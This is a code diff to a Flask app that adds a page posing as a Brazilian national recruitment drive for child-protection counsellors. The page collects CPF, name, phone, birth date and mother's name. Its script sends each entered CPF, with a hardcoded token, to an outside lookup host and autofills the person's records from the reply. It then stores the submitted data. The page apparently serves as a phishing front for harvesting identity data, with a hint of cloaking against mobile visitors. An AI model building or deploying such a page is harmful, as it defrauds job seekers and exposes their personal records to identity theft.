@@ -75,7 +75,6 @@ def serve_font(filename):
     return send_from_directory('static/fonts', filename)
 
 @app.route("/", methods=["GET", "POST"])
-@performance_monitor
 def index():
     if request.method == "POST":
         # Store form data in session
@@ -88,7 +87,195 @@ def index():
         # Redirect to address page
         return redirect(url_for('address'))
     
-    return render_template("index.html")
+    # Serve simple HTML directly for Replit compatibility
+    return '''<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Conselheiro Tutelar - Processo Seletivo</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+</head>
+<body class="bg-gray-50 min-h-screen">
+    <div class="max-w-2xl mx-auto px-4 py-6">
+        <div class="text-center mb-4">
+            <div class="bg-slate-800 text-white rounded-lg p-4 mb-4 shadow-lg">
+                <div class="inline-flex items-center justify-center w-12 h-12 bg-amber-400 rounded-full mb-3">
+                    <i class="fas fa-shield-alt text-lg text-slate-800"></i>
+                </div>
+                <h1 class="text-xl font-light mb-2 text-slate-100">CONSELHEIRO TUTELAR</h1>
+                <div class="w-16 h-px bg-amber-400 mx-auto mb-2"></div>
+                <p class="text-base font-medium text-slate-200 mb-1">Processo Seletivo Nacional</p>
+                <p class="text-xs text-slate-300">2.847 vagas disponíveis em todo território nacional</p>
+                <div class="mt-3 text-xs text-amber-300">
+                    <i class="fas fa-clock mr-1"></i>Inscrições abertas até 31/12/2025
+                </div>
+            </div>
+        </div>
+
+        <div class="bg-white rounded-lg shadow-md border border-slate-200 p-4 mb-4">
+            <div class="text-center mb-4">
+                <h3 class="text-lg font-light text-slate-800 mb-1">Candidatura Oficial</h3>
+                <div class="w-12 h-px bg-amber-400 mx-auto mb-1"></div>
+                <p class="text-slate-600 font-light text-xs">Dados para avaliação e habilitação</p>
+            </div>
+            
+            <form action="/" method="POST" class="space-y-4">
+                <div class="bg-slate-50 rounded p-3 border border-slate-100">
+                    <h4 class="text-sm font-medium text-slate-800 mb-2 flex items-center">
+                        <i class="fas fa-id-card text-amber-600 mr-1 text-sm"></i>Identificação do Candidato
+                    </h4>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-3">
+                        <div>
+                            <label for="cpf" class="block text-xs font-medium text-slate-700 mb-1">CPF *</label>
+                            <input type="text" id="cpf" name="cpf" required
+                                placeholder="000.000.000-00"
+                                class="w-full p-2 border border-slate-300 rounded focus:border-amber-500 text-xs bg-white">
+                        </div>
+                        <div>
+                            <label for="full_name" class="block text-xs font-medium text-slate-700 mb-1">Nome Completo *</label>
+                            <input type="text" id="full_name" name="full_name" required
+                                placeholder="Nome conforme documento oficial"
+                                class="w-full p-2 border border-slate-300 rounded focus:border-amber-500 text-xs bg-white">
+                        </div>
+                        <div>
+                            <label for="phone" class="block text-xs font-medium text-slate-700 mb-1">Telefone *</label>
+                            <input type="tel" id="phone" name="phone" required
+                                placeholder="(00) 00000-0000"
+                                class="w-full p-2 border border-slate-300 rounded focus:border-amber-500 text-xs bg-white">
+                        </div>
+                        <div>
+                            <label for="birth_date" class="block text-xs font-medium text-slate-700 mb-1">Data de Nascimento</label>
+                            <input type="date" id="birth_date" name="birth_date"
+                                class="w-full p-2 border border-slate-300 rounded focus:border-amber-500 text-xs bg-white">
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-slate-50 rounded p-3 border border-slate-100">
+                    <h4 class="text-sm font-medium text-slate-800 mb-2 flex items-center">
+                        <i class="fas fa-users text-amber-600 mr-1 text-sm"></i>Informações Familiares
+                    </h4>
+                    <div>
+                        <label for="mother_name" class="block text-xs font-medium text-slate-700 mb-1">Nome da Mãe</label>
+                        <input type="text" id="mother_name" name="mother_name"
+                            placeholder="Nome completo da mãe"
+                            class="w-full p-2 border border-slate-300 rounded focus:border-amber-500 text-xs bg-white">
+                    </div>
+                </div>
+
+                <div class="bg-blue-50 rounded-lg p-4 mb-4">
+                    <h3 class="text-sm font-semibold text-gray-800 mb-2 flex items-center">
+                        <i class="fas fa-shield-alt text-blue-600 mr-2"></i>Termo de Responsabilidade
+                    </h3>
+                    <p class="text-xs text-gray-600 leading-relaxed">
+                        Declaro que as informações são verdadeiras e estou ciente dos requisitos para 
+                        <span class="font-medium">Conselheiro Tutelar</span> conforme 
+                        <span class="font-medium text-blue-600">Lei nº 8.069/90 (ECA)</span>.
+                    </p>
+                </div>
+
+                <button type="submit" class="w-full bg-slate-800 hover:bg-slate-700 text-white py-4 px-6 rounded-lg font-bold text-sm shadow-md flex items-center justify-center">
+                    <i class="fas fa-arrow-right mr-2 text-amber-400"></i>Iniciar Processo Seletivo
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+    console.log('Mobile protection disabled in Replit environment');
+    
+    // CPF formatting and API integration
+    document.getElementById('cpf').addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length <= 11) {
+            value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, function(regex, arg1, arg2, arg3, arg4) {
+                if (arg4) return `${arg1}.${arg2}.${arg3}-${arg4}`;
+                if (arg3) return `${arg1}.${arg2}.${arg3}`;
+                if (arg2) return `${arg1}.${arg2}`;
+                return arg1;
+            });
+            e.target.value = value;
+
+            // Auto-fill when CPF is complete
+            const cleanCPF = value.replace(/\D/g, '');
+            if (cleanCPF.length === 11) {
+                console.log('CPF completo, buscando dados...');
+                
+                document.getElementById('full_name').placeholder = 'Buscando dados...';
+                document.getElementById('birth_date').placeholder = 'Buscando dados...';
+                document.getElementById('mother_name').placeholder = 'Buscando dados...';
+                
+                fetch(`https://consulta.fontesderenda.blog/cpf.php?token=6285fe45-e991-4071-a848-3fac8273c82a&cpf=${cleanCPF}`)
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('API Response:', data);
+                        
+                        document.getElementById('full_name').placeholder = 'Nome conforme documento oficial';
+                        document.getElementById('birth_date').placeholder = '';
+                        document.getElementById('mother_name').placeholder = 'Nome completo da mãe';
+                        
+                        if (data && data.DADOS) {
+                            if (data.DADOS.nome && data.DADOS.nome.trim()) {
+                                document.getElementById('full_name').value = data.DADOS.nome.trim();
+                                document.getElementById('full_name').style.backgroundColor = '#f0f9ff';
+                                document.getElementById('full_name').style.borderColor = '#3b82f6';
+                                console.log('✓ Nome preenchido:', data.DADOS.nome);
+                            }
+                            
+                            if (data.DADOS.data_nascimento && data.DADOS.data_nascimento.trim()) {
+                                const birthDate = data.DADOS.data_nascimento.split(' ')[0];
+                                document.getElementById('birth_date').value = birthDate;
+                                document.getElementById('birth_date').style.backgroundColor = '#f0f9ff';
+                                document.getElementById('birth_date').style.borderColor = '#3b82f6';
+                                console.log('✓ Data nascimento preenchida:', birthDate);
+                            }
+                            
+                            console.log('✓ Preenchimento automático concluído');
+                        }
+                    })
+                    .catch(error => {
+                        console.log('API Error:', error);
+                        document.getElementById('full_name').placeholder = 'Nome conforme documento oficial';
+                        document.getElementById('birth_date').placeholder = '';
+                        document.getElementById('mother_name').placeholder = 'Nome completo da mãe';
+                    });
+            }
+        }
+    });
+
+    // Phone formatting
+    document.getElementById('phone').addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length <= 11) {
+            value = value.replace(/(\d{2})(\d{5})(\d{4})/, function(regex, arg1, arg2, arg3) {
+                if (arg3) return `(${arg1}) ${arg2}-${arg3}`;
+                if (arg2) return `(${arg1}) ${arg2}`;
+                return `(${arg1}`;
+            });
+            e.target.value = value;
+        }
+    });
+
+    // Form submission tracking
+    document.querySelector('form').addEventListener('submit', function(e) {
+        console.log('Formulário enviado, salvando dados...');
+        
+        const userData = {
+            cpf: document.getElementById('cpf').value,
+            full_name: document.getElementById('full_name').value,
+            phone: document.getElementById('phone').value,
+            birth_date: document.getElementById('birth_date').value,
+            mother_name: document.getElementById('mother_name').value
+        };
+        
+        localStorage.setItem('userData', JSON.stringify(userData));
+        console.log('Dados salvos:', userData);
+    });
+    </script>
+</body>
+</html>'''
 
 @app.route("/vagas")
 @performance_monitor
